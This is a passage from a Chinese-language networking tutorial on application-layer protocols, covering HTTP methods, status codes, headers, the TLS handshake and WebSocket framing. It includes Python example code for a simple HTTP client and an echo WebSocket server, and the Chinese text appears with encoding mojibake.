<h2 id="ç¬¬å…­ç« åº”ç”¨å±‚åè®®"><a class="header" href="#ç¬¬å…­ç« åº”ç”¨å±‚åè®®">ç¬¬å…­ç« ï¼šåº”ç”¨å±‚åè®®</a></h2>
<h3 id="61-httphttps-åè®®æ·±åº¦è§£æ"><a class="header" href="#61-httphttps-åè®®æ·±åº¦è§£æ">6.1 HTTP/HTTPS åè®®æ·±åº¦è§£æ</a></h3>
<h4 id="httpåè®®ç‰¹ç‚¹"><a class="header" href="#httpåè®®ç‰¹ç‚¹">HTTPåè®®ç‰¹ç‚¹</a></h4>
<ul>
<li><strong>æ— çŠ¶æ€</strong>: æ¯æ¬¡è¯·æ±‚éƒ½æ˜¯ç‹¬ç«‹çš„ï¼ŒæœåŠ¡å™¨ä¸ä¿å­˜å®¢æˆ·ç«¯çŠ¶æ€</li>
<li><strong>åŸºäºè¯·æ±‚-å“åº”</strong>: å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚ï¼ŒæœåŠ¡å™¨è¿”å›å“åº”</li>
<li><strong>æ–‡æœ¬åè®®</strong>: ä½¿ç”¨å¯è¯»çš„æ–‡æœ¬æ ¼å¼ä¼ è¾“æ•°æ®</li>
<li><strong>é»˜è®¤ç«¯å£</strong>: HTTPä½¿ç”¨80ç«¯å£ï¼ŒHTTPSä½¿ç”¨443ç«¯å£</li>
</ul>
<h4 id="httpè¯·æ±‚æ ¼å¼"><a class="header" href="#httpè¯·æ±‚æ ¼å¼">HTTPè¯·æ±‚æ ¼å¼</a></h4>
<pre><code>GET /api/users HTTP/1.1\r\n
Host: example.com\r\n
User-Agent: Mozilla/5.0\r\n
Accept: application/json\r\n
Connection: keep-alive\r\n
\r\n
[è¯·æ±‚ä½“]
</code></pre>
<p><strong>è¯·æ±‚è¡Œç»„æˆ</strong>:</p>
<pre><code>æ–¹æ³• + ç©ºæ ¼ + URI + ç©ºæ ¼ + åè®®ç‰ˆæœ¬ + CRLF
GET /index.html HTTP/1.1\r\n
</code></pre>
<h4 id="httpè¯·æ±‚æ–¹æ³•è¯¦è§£"><a class="header" href="#httpè¯·æ±‚æ–¹æ³•è¯¦è§£">HTTPè¯·æ±‚æ–¹æ³•è¯¦è§£</a></h4>
<div class="table-wrapper"><table><thead><tr><th>æ–¹æ³•</th><th>æè¿°</th><th>å¹‚ç­‰æ€§</th><th>å®‰å…¨æ€§</th><th>è¯·æ±‚ä½“</th><th>å“åº”ä½“</th><th>å…¸å‹ç”¨é€”</th></tr></thead><tbody>
<tr><td><strong>GET</strong></td><td>è·å–èµ„æº</td><td>æ˜¯</td><td>æ˜¯</td><td>å¦</td><td>æ˜¯</td><td>æŸ¥è¯¢æ•°æ®ã€ä¸‹è½½æ–‡ä»¶</td></tr>
<tr><td><strong>POST</strong></td><td>åˆ›å»ºèµ„æº</td><td>å¦</td><td>å¦</td><td>æ˜¯</td><td>æ˜¯</td><td>æäº¤è¡¨å•ã€ä¸Šä¼ æ–‡ä»¶</td></tr>
<tr><td><strong>PUT</strong></td><td>æ›´æ–°èµ„æº</td><td>æ˜¯</td><td>å¦</td><td>æ˜¯</td><td>æ˜¯</td><td>å®Œæ•´æ›´æ–°èµ„æº</td></tr>
<tr><td><strong>PATCH</strong></td><td>éƒ¨åˆ†æ›´æ–°</td><td>å¦</td><td>å¦</td><td>æ˜¯</td><td>æ˜¯</td><td>éƒ¨åˆ†æ›´æ–°èµ„æº</td></tr>
<tr><td><strong>DELETE</strong></td><td>åˆ é™¤èµ„æº</td><td>æ˜¯</td><td>å¦</td><td>å¯é€‰</td><td>å¯é€‰</td><td>åˆ é™¤æ•°æ®</td></tr>
<tr><td><strong>HEAD</strong></td><td>è·å–å¤´éƒ¨</td><td>æ˜¯</td><td>æ˜¯</td><td>å¦</td><td>å¦</td><td>æ£€æŸ¥èµ„æºæ˜¯å¦å­˜åœ¨</td></tr>
<tr><td><strong>OPTIONS</strong></td><td>è·å–æ”¯æŒçš„æ–¹æ³•</td><td>æ˜¯</td><td>æ˜¯</td><td>å¦</td><td>æ˜¯</td><td>CORSé¢„æ£€è¯·æ±‚</td></tr>
<tr><td><strong>TRACE</strong></td><td>è¿½è¸ªè¯·æ±‚</td><td>æ˜¯</td><td>æ˜¯</td><td>å¦</td><td>æ˜¯</td><td>è¯Šæ–­</td></tr>
<tr><td><strong>CONNECT</strong></td><td>å»ºç«‹éš§é“</td><td>å¦</td><td>å¦</td><td>å¯é€‰</td><td>å¯é€‰</td><td>HTTPSä»£ç†</td></tr>
</tbody></table>
</div>
<h4 id="httpçŠ¶æ€ç å®Œæ•´åˆ†ç±»"><a class="header" href="#httpçŠ¶æ€ç å®Œæ•´åˆ†ç±»">HTTPçŠ¶æ€ç å®Œæ•´åˆ†ç±»</a></h4>
<p><strong>1xx - ä¿¡æ¯æ€§çŠ¶æ€ç </strong></p>
<pre><code>100 Continue          - å®¢æˆ·ç«¯åº”ç»§ç»­è¯·æ±‚
101 Switching Protocols - æœåŠ¡å™¨æ­£åœ¨åˆ‡æ¢åè®®
102 Processing        - æœåŠ¡å™¨æ­£åœ¨å¤„ç†è¯·æ±‚ï¼ˆWebDAVï¼‰
103 Early Hints       - æå‰è¿”å›éƒ¨åˆ†å“åº”å¤´
</code></pre>
<p><strong>2xx - æˆåŠŸçŠ¶æ€ç </strong></p>
<pre><code>200 OK                - è¯·æ±‚æˆåŠŸ
201 Created           - èµ„æºå·²åˆ›å»º
202 Accepted          - è¯·æ±‚å·²æ¥å—ï¼Œä½†æœªå®Œæˆå¤„ç†
203 Non-Authoritative - è¿”å›çš„ä¿¡æ¯å¯èƒ½æ¥è‡ªå‰¯æœ¬
204 No Content        - è¯·æ±‚æˆåŠŸä½†æ— è¿”å›å†…å®¹
205 Reset Content     - è¯·æ±‚æˆåŠŸï¼Œé‡ç½®æ–‡æ¡£è§†å›¾
206 Partial Content   - éƒ¨åˆ†å†…å®¹ï¼ˆRangeè¯·æ±‚ï¼‰
</code></pre>
<p><strong>3xx - é‡å®šå‘çŠ¶æ€ç </strong></p>
<pre><code>300 Multiple Choices  - å¤šç§é€‰æ‹©
301 Moved Permanently - æ°¸ä¹…é‡å®šå‘
302 Found             - ä¸´æ—¶é‡å®šå‘
303 See Other         - æŸ¥çœ‹å…¶ä»–ä½ç½®
304 Not Modified      - èµ„æºæœªä¿®æ”¹ï¼Œä½¿ç”¨ç¼“å­˜
307 Temporary Redirect - ä¸´æ—¶é‡å®šå‘ï¼ˆä¿æŒæ–¹æ³•ï¼‰
308 Permanent Redirect - æ°¸ä¹…é‡å®šå‘ï¼ˆä¿æŒæ–¹æ³•ï¼‰
</code></pre>
<p><strong>4xx - å®¢æˆ·ç«¯é”™è¯¯</strong></p>
<pre><code>400 Bad Request       - è¯·æ±‚è¯­æ³•é”™è¯¯
401 Unauthorized      - æœªè®¤è¯
402 Payment Required  - ä¿ç•™ï¼ˆæœªä½¿ç”¨ï¼‰
403 Forbidden         - ç¦æ­¢è®¿é—®
404 Not Found         - èµ„æºä¸å­˜åœ¨
405 Method Not Allowed - æ–¹æ³•ä¸å…è®¸
406 Not Acceptable    - ä¸å¯æ¥å—
407 Proxy Authentication Required - éœ€è¦ä»£ç†è®¤è¯
408 Request Timeout   - è¯·æ±‚è¶…æ—¶
409 Conflict          - å†²çª
410 Gone              - èµ„æºå·²æ°¸ä¹…åˆ é™¤
411 Length Required   - éœ€è¦Content-Length
412 Precondition Failed - å‰ç½®æ¡ä»¶å¤±è´¥
413 Payload Too Large - è¯·æ±‚ä½“è¿‡å¤§
414 URI Too Long      - URIè¿‡é•¿
415 Unsupported Media Type - ä¸æ”¯æŒçš„åª’ä½“ç±»å‹
416 Range Not Satisfiable - Rangeè¯·æ±‚æ— æ•ˆ
417 Expectation Failed - Expectå¤´éƒ¨å¤±è´¥
418 I'm a teapot      - å½©è›‹çŠ¶æ€ç 
421 Misdirected Request - è¯·æ±‚è¢«é”™è¯¯å®šå‘
422 Unprocessable Entity - æ— æ³•å¤„ç†å®ä½“
423 Locked            - èµ„æºè¢«é”å®š
424 Failed Dependency - ä¾èµ–å¤±è´¥
425 Too Early         - è¯·æ±‚è¿‡æ—©
426 Upgrade Required  - éœ€è¦å‡çº§åè®®
428 Precondition Required - éœ€è¦å‰ç½®æ¡ä»¶
429 Too Many Requests - è¯·æ±‚è¿‡å¤š
431 Request Header Fields Too Large - è¯·æ±‚å¤´è¿‡å¤§
451 Unavailable For Legal Reasons - å› æ³•å¾‹åŸå› ä¸å¯ç”¨
</code></pre>
<p><strong>5xx - æœåŠ¡å™¨é”™è¯¯</strong></p>
<pre><code>500 Internal Server Error - æœåŠ¡å™¨å†…éƒ¨é”™è¯¯
501 Not Implemented   - åŠŸèƒ½æœªå®ç°
502 Bad Gateway       - ç½‘å…³é”™è¯¯
503 Service Unavailable - æœåŠ¡ä¸å¯ç”¨
504 Gateway Timeout   - ç½‘å…³è¶…æ—¶
505 HTTP Version Not Supported - HTTPç‰ˆæœ¬ä¸æ”¯æŒ
506 Variant Also Negotiates - å†…éƒ¨é…ç½®é”™è¯¯
507 Insufficient Storage - å­˜å‚¨ç©ºé—´ä¸è¶³
508 Loop Detected     - æ£€æµ‹åˆ°å¾ªç¯
510 Not Extended      - éœ€è¦æ‰©å±•
511 Network Authentication Required - éœ€è¦ç½‘ç»œè®¤è¯
</code></pre>
<h4 id="httpå¤´éƒ¨å­—æ®µ"><a class="header" href="#httpå¤´éƒ¨å­—æ®µ">HTTPå¤´éƒ¨å­—æ®µ</a></h4>
<p><strong>é€šç”¨å¤´éƒ¨</strong>:</p>
<pre><code>Cache-Control: max-age=3600       # ç¼“å­˜æ§åˆ¶
Connection: keep-alive            # è¿æ¥ç®¡ç†
Date: Wed, 21 Oct 2015 07:28:00 GMT # æ¶ˆæ¯å‘é€æ—¶é—´
Transfer-Encoding: chunked        # ä¼ è¾“ç¼–ç 
Upgrade: websocket                # åè®®å‡çº§
Via: 1.1 proxy.example.com        # ä»£ç†ä¿¡æ¯
Warning: 199 Miscellaneous warning # è­¦å‘Šä¿¡æ¯
</code></pre>
<p><strong>è¯·æ±‚å¤´éƒ¨</strong>:</p>
<pre><code>Accept: application/json          # å¯æ¥å—çš„åª’ä½“ç±»å‹
Accept-Charset: utf-8             # å¯æ¥å—çš„å­—ç¬¦é›†
Accept-Encoding: gzip, deflate    # å¯æ¥å—çš„ç¼–ç 
Accept-Language: en-US,en;q=0.9   # å¯æ¥å—çš„è¯­è¨€
Authorization: Bearer &lt;token&gt;     # è®¤è¯ä¿¡æ¯
Cookie: session=abc123            # Cookie
Host: www.example.com             # ä¸»æœºåï¼ˆå¿…éœ€ï¼‰
If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT # æ¡ä»¶è¯·æ±‚
If-None-Match: "686897696a7c876b7e" # ETagæ¡ä»¶
Referer: https://www.google.com/  # æ¥æºé¡µé¢
User-Agent: Mozilla/5.0...        # ç”¨æˆ·ä»£ç†
Origin: https://example.com       # è¯·æ±‚æ¥æºï¼ˆCORSï¼‰
</code></pre>
<p><strong>å“åº”å¤´éƒ¨</strong>:</p>
<pre><code>Age: 12                           # ç¼“å­˜å¹´é¾„
Allow: GET, POST, HEAD            # å…è®¸çš„æ–¹æ³•
Content-Encoding: gzip            # å†…å®¹ç¼–ç 
Content-Language: en              # å†…å®¹è¯­è¨€
Content-Length: 1234              # å†…å®¹é•¿åº¦
Content-Type: application/json    # å†…å®¹ç±»å‹
ETag: "686897696a7c876b7e"        # å®ä½“æ ‡ç­¾
Expires: Wed, 21 Oct 2015 07:28:00 GMT # è¿‡æœŸæ—¶é—´
Last-Modified: Wed, 21 Oct 2015 07:28:00 GMT # æœ€åä¿®æ”¹æ—¶é—´
Location: https://www.example.com/ # é‡å®šå‘ä½ç½®
Server: nginx/1.18.0              # æœåŠ¡å™¨ä¿¡æ¯
Set-Cookie: session=abc123; HttpOnly # è®¾ç½®Cookie
WWW-Authenticate: Basic realm="Access" # è®¤è¯æ–¹å¼
Access-Control-Allow-Origin: *    # CORSå¤´éƒ¨
</code></pre>
<h4 id="http11-vs-http2-vs-http3"><a class="header" href="#http11-vs-http2-vs-http3">HTTP/1.1 vs HTTP/2 vs HTTP/3</a></h4>
<div class="table-wrapper"><table><thead><tr><th>ç‰¹æ€§</th><th>HTTP/1.1</th><th>HTTP/2</th><th>HTTP/3</th></tr></thead><tbody>
<tr><td><strong>ä¼ è¾“å±‚</strong></td><td>TCP</td><td>TCP</td><td>QUIC (UDP)</td></tr>
<tr><td><strong>å¤šè·¯å¤ç”¨</strong></td><td>å¦</td><td>æ˜¯</td><td>æ˜¯</td></tr>
<tr><td><strong>å¤´éƒ¨å‹ç¼©</strong></td><td>å¦</td><td>HPACK</td><td>QPACK</td></tr>
<tr><td><strong>æœåŠ¡å™¨æ¨é€</strong></td><td>å¦</td><td>æ˜¯</td><td>æ˜¯</td></tr>
<tr><td><strong>äºŒè¿›åˆ¶åè®®</strong></td><td>å¦</td><td>æ˜¯</td><td>æ˜¯</td></tr>
<tr><td><strong>é˜Ÿå¤´é˜»å¡</strong></td><td>æ˜¯</td><td>éƒ¨åˆ†ï¼ˆTCPå±‚ï¼‰</td><td>å¦</td></tr>
<tr><td><strong>è¿æ¥å¤ç”¨</strong></td><td>éœ€Keep-Alive</td><td>æ˜¯</td><td>æ˜¯</td></tr>
<tr><td><strong>åŠ å¯†</strong></td><td>å¯é€‰ï¼ˆHTTPSï¼‰</td><td>é€šå¸¸è¦æ±‚</td><td>å¼ºåˆ¶TLS 1.3</td></tr>
</tbody></table>
</div>
<h4 id="httpså·¥ä½œåŸç†"><a class="header" href="#httpså·¥ä½œåŸç†">HTTPSå·¥ä½œåŸç†</a></h4>
<p><strong>HTTPS = HTTP + TLS/SSL</strong></p>
<p><strong>TLSæ¡æ‰‹è¿‡ç¨‹</strong>:</p>
<pre><code>å®¢æˆ·ç«¯                                     æœåŠ¡å™¨
   â”‚                                         â”‚
   â”‚â”€â”€â”€â”€â”€â”€ ClientHello â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚  1. æ”¯æŒçš„åè®®ç‰ˆæœ¬å’ŒåŠ å¯†å¥—ä»¶
   â”‚                                         â”‚
   â”‚â†â”€â”€â”€â”€â”€ ServerHello â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚  2. é€‰æ‹©çš„åè®®ç‰ˆæœ¬å’ŒåŠ å¯†å¥—ä»¶
   â”‚â†â”€â”€â”€â”€â”€ Certificate â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚  3. æœåŠ¡å™¨è¯ä¹¦
   â”‚â†â”€â”€â”€â”€â”€ ServerHelloDone â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚  4. æ¡æ‰‹å®Œæˆ
   â”‚                                         â”‚
   â”‚â”€â”€â”€â”€â”€â”€ ClientKeyExchange â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚  5. é¢„ä¸»å¯†é’¥ï¼ˆåŠ å¯†ï¼‰
   â”‚â”€â”€â”€â”€â”€â”€ ChangeCipherSpec â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚  6. åˆ‡æ¢åˆ°åŠ å¯†é€šä¿¡
   â”‚â”€â”€â”€â”€â”€â”€ Finished â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚  7. æ¡æ‰‹å®Œæˆæ¶ˆæ¯
   â”‚                                         â”‚
   â”‚â†â”€â”€â”€â”€â”€ ChangeCipherSpec â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚  8. åˆ‡æ¢åˆ°åŠ å¯†é€šä¿¡
   â”‚â†â”€â”€â”€â”€â”€ Finished â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚  9. æ¡æ‰‹å®Œæˆæ¶ˆæ¯
   â”‚                                         â”‚
   â”‚ â•â•â•â•â•â• åŠ å¯†çš„åº”ç”¨æ•°æ® â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â”‚
   â”‚                                         â”‚
</code></pre>
<p><strong>å®æˆ˜ç¤ºä¾‹ï¼šHTTPå®¢æˆ·ç«¯å®ç°</strong></p>
<pre><code class="language-python">import socket
import ssl

class HTTPClient:
    """ç®€å•çš„HTTP/HTTPSå®¢æˆ·ç«¯"""

    def __init__(self):
        self.sock = None

    def request(self, method, url, headers=None, body=None):
        """å‘é€HTTPè¯·æ±‚"""
        # è§£æURL
        if url.startswith('https://'):
            protocol = 'https'
            default_port = 443
            url = url[8:]
        elif url.startswith('http://'):
            protocol = 'http'
            default_port = 80
            url = url[7:]
        else:
            protocol = 'http'
            default_port = 80

        # åˆ†ç¦»ä¸»æœºå’Œè·¯å¾„
        if '/' in url:
            host, path = url.split('/', 1)
            path = '/' + path
        else:
            host = url
            path = '/'

        # åˆ†ç¦»ç«¯å£
        if ':' in host:
            host, port = host.split(':')
            port = int(port)
        else:
            port = default_port

        # æ„é€ è¯·æ±‚
        request_line = f"{method} {path} HTTP/1.1\r\n"

        # é»˜è®¤å¤´éƒ¨
        if headers is None:
            headers = {}
        headers.setdefault('Host', host)
        headers.setdefault('User-Agent', 'Python-HTTP-Client/1.0')
        headers.setdefault('Connection', 'close')

        if body:
            headers['Content-Length'] = str(len(body))

        # æ„é€ å¤´éƒ¨
        header_lines = '\r\n'.join([f"{k}: {v}" for k, v in headers.items()])

        # å®Œæ•´è¯·æ±‚
        request = request_line + header_lines + '\r\n\r\n'
        if body:
            request += body

        # å‘é€è¯·æ±‚
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        if protocol == 'https':
            # TLSåŒ…è£…
            context = ssl.create_default_context()
            self.sock = context.wrap_socket(self.sock, server_hostname=host)

        self.sock.connect((host, port))
        self.sock.sendall(request.encode())

        # æ¥æ”¶å“åº”
        response = b''
        while True:
            chunk = self.sock.recv(4096)
            if not chunk:
                break
            response += chunk

        self.sock.close()

        # è§£æå“åº”
        return self.parse_response(response)

    def parse_response(self, response):
        """è§£æHTTPå“åº”"""
        response_str = response.decode('utf-8', errors='ignore')

        # åˆ†ç¦»å¤´éƒ¨å’Œä¸»ä½“
        if '\r\n\r\n' in response_str:
            headers, body = response_str.split('\r\n\r\n', 1)
        else:
            headers = response_str
            body = ''

        # è§£æçŠ¶æ€è¡Œ
        lines = headers.split('\r\n')
        status_line = lines[0]
        parts = status_line.split(' ', 2)

        if len(parts) &gt;= 3:
            version, status_code, reason = parts
        else:
            version, status_code, reason = parts[0], parts[1], ''

        # è§£æå¤´éƒ¨
        header_dict = {}
        for line in lines[1:]:
            if ': ' in line:
                key, value = line.split(': ', 1)
                header_dict[key] = value

        return {
            'version': version,
            'status_code': int(status_code),
            'reason': reason,
            'headers': header_dict,
            'body': body
        }

    def get(self, url, headers=None):
        """GETè¯·æ±‚"""
        return self.request('GET', url, headers)

    def post(self, url, data, headers=None):
        """POSTè¯·æ±‚"""
        return self.request('POST', url, headers, data)

# ä½¿ç”¨ç¤ºä¾‹
if __name__ == "__main__":
    client = HTTPClient()

    # HTTP GETè¯·æ±‚
    print("=" * 60)
    print("HTTP GET è¯·æ±‚ç¤ºä¾‹")
    print("=" * 60)
    response = client.get('http://www.baidu.com/')
    print(f"çŠ¶æ€ç : {response['status_code']}")
    print(f"å“åº”ä½“: {response['body'][:200]}...")

    # HTTPS GETè¯·æ±‚
    print("\n" + "=" * 60)
    print("HTTPS GET è¯·æ±‚ç¤ºä¾‹")
    print("=" * 60)
    response = client.get('https://www.baidu.com/')
    print(f"çŠ¶æ€ç : {response['status_code']}")
    print(f"Content-Type: {response['headers'].get('Content-Type')}")
</code></pre>
<h3 id="62-websocket-åè®®"><a class="header" href="#62-websocket-åè®®">6.2 WebSocket åè®®</a></h3>
<h4 id="websocketç‰¹ç‚¹"><a class="header" href="#websocketç‰¹ç‚¹">WebSocketç‰¹ç‚¹</a></h4>
<p><strong>ä¸HTTPçš„åŒºåˆ«</strong>:</p>
<pre><code>HTTP:
- è¯·æ±‚-å“åº”æ¨¡å¼
- å•å‘é€šä¿¡
- æ¯æ¬¡è¯·æ±‚éƒ½éœ€è¦å»ºç«‹è¿æ¥
- å¤´éƒ¨å¼€é”€å¤§

WebSocket:
- å…¨åŒå·¥é€šä¿¡
- æŒä¹…è¿æ¥
- æœåŠ¡å™¨å¯ä¸»åŠ¨æ¨é€
- å¤´éƒ¨å¼€é”€å°ï¼ˆæ¡æ‰‹åï¼‰
</code></pre>
<h4 id="websocketæ¡æ‰‹è¿‡ç¨‹"><a class="header" href="#websocketæ¡æ‰‹è¿‡ç¨‹">WebSocketæ¡æ‰‹è¿‡ç¨‹</a></h4>
<pre><code>å®¢æˆ·ç«¯                                     æœåŠ¡å™¨
   â”‚                                         â”‚
   â”‚â”€â”€â”€â”€â”€â”€ HTTP Upgrade Request â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚
   â”‚  GET /chat HTTP/1.1                     â”‚
   â”‚  Host: server.example.com               â”‚
   â”‚  Upgrade: websocket                     â”‚
   â”‚  Connection: Upgrade                    â”‚
   â”‚  Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
   â”‚  Sec-WebSocket-Version: 13              â”‚
   â”‚                                         â”‚
   â”‚â†â”€â”€â”€â”€â”€ HTTP 101 Switching Protocols â”€â”€â”€â”€â”‚
   â”‚  HTTP/1.1 101 Switching Protocols       â”‚
   â”‚  Upgrade: websocket                     â”‚
   â”‚  Connection: Upgrade                    â”‚
   â”‚  Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
   â”‚                                         â”‚
   â”‚ â•â•â•â•â•â• WebSocket æ•°æ®å¸§ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â”‚
   â”‚                                         â”‚
</code></pre>
<h4 id="websocketæ•°æ®å¸§æ ¼å¼"><a class="header" href="#websocketæ•°æ®å¸§æ ¼å¼">WebSocketæ•°æ®å¸§æ ¼å¼</a></h4>
<pre><code>  0                   1                   2                   3
  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
 +-+-+-+-+-------+-+-------------+-------------------------------+
 |F|R|R|R| opcode|M| Payload len |    Extended payload length    |
 |I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |
 |N|V|V|V|       |S|             |   (if payload len==126/127)   |
 | |1|2|3|       |K|             |                               |
 +-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +
 |     Extended payload length continued, if payload len == 127  |
 + - - - - - - - - - - - - - - - +-------------------------------+
 |                               |Masking-key, if MASK set to 1  |
 +-------------------------------+-------------------------------+
 | Masking-key (continued)       |          Payload Data         |
 +-------------------------------- - - - - - - - - - - - - - - - +
 :                     Payload Data continued ...                :
 + - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
 |                     Payload Data continued ...                |
 +---------------------------------------------------------------+
</code></pre>
<p><strong>å­—æ®µè¯´æ˜</strong>:</p>
<ul>
<li><strong>FIN (1 bit)</strong>: æ˜¯å¦ä¸ºæœ€åä¸€å¸§</li>
<li><strong>RSV1-3 (3 bits)</strong>: ä¿ç•™ä½</li>
<li><strong>Opcode (4 bits)</strong>: æ“ä½œç 
<pre><code>0x0: ç»§ç»­å¸§
0x1: æ–‡æœ¬å¸§
0x2: äºŒè¿›åˆ¶å¸§
0x8: è¿æ¥å…³é—­
0x9: Ping
0xA: Pong
</code></pre>
</li>
<li><strong>MASK (1 bit)</strong>: æ˜¯å¦ä½¿ç”¨æ©ç ï¼ˆå®¢æˆ·ç«¯å¿…é¡»ä¸º1ï¼‰</li>
<li><strong>Payload Length (7 bits)</strong>: è´Ÿè½½é•¿åº¦
<ul>
<li>0-125: å®é™…é•¿åº¦</li>
<li>126: åç»­2å­—èŠ‚ä¸ºé•¿åº¦</li>
<li>127: åç»­8å­—èŠ‚ä¸ºé•¿åº¦</li>
</ul>
</li>
<li><strong>Masking-key (32 bits)</strong>: æ©ç å¯†é’¥</li>
<li><strong>Payload Data</strong>: å®é™…æ•°æ®</li>
</ul>
<p><strong>å®æˆ˜ç¤ºä¾‹ï¼šWebSocketæœåŠ¡å™¨</strong></p>
<pre><code class="language-python">import socket
import hashlib
import base64
import struct

class WebSocketServer:
    """ç®€å•çš„WebSocketæœåŠ¡å™¨"""

    GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

    def __init__(self, host='0.0.0.0', port=8765):
        self.host = host
        self.port = port
        self.server_socket = None

    def start(self):
        """å¯åŠ¨æœåŠ¡å™¨"""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)

        print(f"WebSocketæœåŠ¡å™¨è¿è¡Œåœ¨ ws://{self.host}:{self.port}")

        while True:
            client_sock, addr = self.server_socket.accept()
            print(f"æ–°è¿æ¥æ¥è‡ª {addr}")
            self.handle_client(client_sock)

    def handle_client(self, client_sock):
        """å¤„ç†å®¢æˆ·ç«¯è¿æ¥"""
        # æ¥æ”¶HTTPæ¡æ‰‹è¯·æ±‚
        request = client_sock.recv(1024).decode()

        # è§£æSec-WebSocket-Key
        key = None
        for line in request.split('\r\n'):
            if line.startswith('Sec-WebSocket-Key:'):
                key = line.split(': ')[1]
                break

        if not key:
            client_sock.close()
            return

        # è®¡ç®—Sec-WebSocket-Accept
        accept = base64.b64encode(
            hashlib.sha1((key + self.GUID).encode()).digest()
        ).decode()

        # å‘é€æ¡æ‰‹å“åº”
        response = (
            'HTTP/1.1 101 Switching Protocols\r\n'
            'Upgrade: websocket\r\n'
            'Connection: Upgrade\r\n'
            f'Sec-WebSocket-Accept: {accept}\r\n'
            '\r\n'
        )
        client_sock.send(response.encode())

        print("WebSocketæ¡æ‰‹å®Œæˆ")

        # å¤„ç†WebSocketå¸§
        try:
            while True:
                frame = self.receive_frame(client_sock)
                if frame is None:
                    break

                opcode, payload = frame

                if opcode == 0x1:  # æ–‡æœ¬å¸§
                    print(f"æ¥æ”¶åˆ°æ–‡æœ¬: {payload.decode('utf-8')}")
                    # å›æ˜¾æ¶ˆæ¯
                    self.send_frame(client_sock, 0x1, payload)
                elif opcode == 0x8:  # å…³é—­å¸§
                    print("å®¢æˆ·ç«¯è¯·æ±‚å…³é—­è¿æ¥")
                    break
                elif opcode == 0x9:  # Ping
                    # å“åº”Pong
                    self.send_frame(client_sock, 0xA, payload)

        except Exception as e:
            print(f"é”™è¯¯: {e}")
        finally:
            client_sock.close()
            print("è¿æ¥å·²å…³é—­")

    def receive_frame(self, sock):
        """æ¥æ”¶WebSocketå¸§"""
        try:
            # è¯»å–å‰2å­—èŠ‚
            header = sock.recv(2)
            if len(header) &lt; 2:
                return None

            byte1, byte2 = header[0], header[1]

            # è§£æå¤´éƒ¨
            fin = (byte1 &gt;&gt; 7) &amp; 1
            opcode = byte1 &amp; 0x0F
            mask = (byte2 &gt;&gt; 7) &amp; 1
            payload_len = byte2 &amp; 0x7F

            # è¯»å–æ‰©å±•é•¿åº¦
            if payload_len == 126:
                extended_len = sock.recv(2)
                payload_len = struct.unpack('!H', extended_len)[0]
            elif payload_len == 127:
                extended_len = sock.recv(8)
                payload_len = struct.unpack('!Q', extended_len)[0]

            # è¯»å–æ©ç 
            if mask:
                masking_key = sock.recv(4)
            else:
                masking_key = None

            # è¯»å–è´Ÿè½½
            payload = sock.recv(payload_len)

            # è§£é™¤æ©ç 
            if mask and masking_key:
                payload = bytes([payload[i] ^ masking_key[i % 4]
                                for i in range(len(payload))])

            return (opcode, payload)

        except Exception as e:
            print(f"æ¥æ”¶å¸§é”™è¯¯: {e}")
            return None

    def send_frame(self, sock, opcode, payload):
        """å‘é€WebSocketå¸§"""
        frame = bytearray()

        # ç¬¬ä¸€å­—èŠ‚: FIN=1, opcode
        frame.append(0x80 | opcode)

        # ç¬¬äºŒå­—èŠ‚: MASK=0, payload length
        payload_len = len(payload)
        if payload_len &lt;= 125:
            frame.append(payload_len)
        elif payload_len &lt;= 65535:
            frame.append(126)
            frame.extend(struct.pack('!H', payload_len))
        else:
            frame.append(127)
            frame.extend(struct.pack('!Q', payload_len))

        # è´Ÿè½½æ•°æ®
        frame.extend(payload)

        sock.send(frame)

# ä½¿ç”¨ç¤ºä¾‹
if __name__ == "__main__":
    server = WebSocketServer()
    server.start()
</code></pre>
<p><strong>WebSocketå®¢æˆ·ç«¯ç¤ºä¾‹ï¼ˆJavaScriptï¼‰</strong>:</p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;WebSocket Client&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;WebSocketå®¢æˆ·ç«¯&lt;/h1&gt;
    &lt;input type="text" id="message" placeholder="è¾“å…¥æ¶ˆæ¯"&gt;
    &lt;button onclick="sendMessage()"&gt;å‘é€&lt;/button&gt;
    &lt;div id="output"&gt;&lt;/div&gt;

    &lt;script&gt;
        // è¿æ¥WebSocketæœåŠ¡å™¨
        const ws = new WebSocket('ws://localhost:8765');

